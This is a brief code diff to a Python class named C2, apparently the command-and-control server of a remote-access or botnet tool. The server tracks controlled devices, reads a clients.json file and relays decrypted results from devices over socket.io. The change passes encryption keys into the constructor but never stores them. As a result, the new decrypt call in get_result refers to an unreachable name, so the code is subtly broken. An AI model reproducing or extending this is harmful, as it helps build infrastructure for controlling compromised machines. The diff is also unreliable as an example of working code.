@@ -16,14 +16,10 @@ import threading
 from encryption import encrypt_messages
 
 class C2:
-    def __init__(self, sio):
+    def __init__(self, sio, keys):
         self.sio = sio
         self.devices = {}
         self.total_devices = {}
-
-        keys = encrypt_messages()
-        self.public_key = keys.receive_public_key()
-        self.private_key = keys.receive_private_key()
 
         try:
             with open("clients.json", "r") as f:
@@ -178,7 +174,7 @@ class C2:
     def get_result(self, sid, data):
         for device in self.devices:
             if self.devices[device]["sid"] == sid:
-                self.sio.emit("result", {"uid": device, "result": data})
+                self.sio.emit("result", {"uid": device, "result": json.loads(keys.decrypt(data))})
                 break
 
     def ctrl(self, data):
